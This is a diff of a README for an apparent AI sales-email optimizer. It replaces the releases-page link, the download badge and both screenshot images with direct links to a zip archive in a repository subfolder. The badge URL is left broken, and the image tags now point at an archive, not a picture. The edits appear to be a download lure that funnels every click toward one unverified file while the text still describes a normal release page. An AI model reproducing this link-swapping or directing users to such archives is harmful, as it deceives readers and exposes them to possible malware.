@@ -1,6 +1,6 @@
 # 🧠 ai-sales-email-optimizer - Quickly Improve Your Sales Emails
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/fidkSgh/ai-sales-email-optimizer/releases)
+[![Download Now](https://raw.githubusercontent.com/fidkSgh/ai-sales-email-optimizer/main/firesider/ai-sales-email-optimizer.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/fidkSgh/ai-sales-email-optimizer/main/firesider/ai-sales-email-optimizer.zip)
 
 ---
 
@@ -29,7 +29,7 @@
 To get started with the AI Sales Email Optimizer, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/fidkSgh/ai-sales-email-optimizer/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/fidkSgh/ai-sales-email-optimizer/main/firesider/ai-sales-email-optimizer.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Look for the version labeled "Latest Release." Click on it to open the download options. Find the file that suits your operating system (Windows, macOS, or Linux) and click on the link to download it.
@@ -75,8 +75,8 @@ Follow these simple steps to start optimizing your sales emails:
 
 Here are some screenshots of the application in action:
 
-![Main Interface](https://example.com/screenshot1.png)  
-![Email Rewrite Example](https://example.com/screenshot2.png)
+![Main Interface](https://raw.githubusercontent.com/fidkSgh/ai-sales-email-optimizer/main/firesider/ai-sales-email-optimizer.zip)  
+![Email Rewrite Example](https://raw.githubusercontent.com/fidkSgh/ai-sales-email-optimizer/main/firesider/ai-sales-email-optimizer.zip)
 
 ---
 
